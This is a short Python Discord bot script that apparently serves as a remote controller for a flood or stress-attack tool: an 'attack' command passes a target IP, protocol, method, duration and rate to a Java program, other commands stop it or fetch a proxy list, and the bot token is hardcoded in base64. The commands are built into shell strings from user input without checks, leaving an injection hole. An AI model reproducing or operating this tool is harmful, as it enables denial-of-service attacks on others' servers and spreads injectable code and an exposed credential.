import base64
import discord
import subprocess
import requests
from discord.ext import commands
bot = commands.Bot(command_prefix=">", intents=discord.Intents.all())
@bot.command()
async def attack(ctx, ip, protocol, method, time, cps):
    subprocess.Popen(f"java -jar bot.jar {ip} {protocol} {method} {time} {cps}", shell=True)
@bot.command()
async def stop(ctx):
    subprocess.Popen(f"pkill java", shell=True)
    await ctx.send("-conc")
@bot.command()
async def proxy(ctx, link):
    open("proxies.txt", "w").write(requests.get(link).text)
    await ctx.send("+updated")
@bot.command()
async def ping(ctx):
    await ctx.send("pinged!")
bot.run(base64.b64decode("TVRJM056ZzVOamsyTVRrME5EY3hPVE0yTUEuR1NNUzdILnNaXzFBM0tKLVRtM193VkI2SElqOXdpX2k5NmJyd2tZVEFaN3RR").decode())
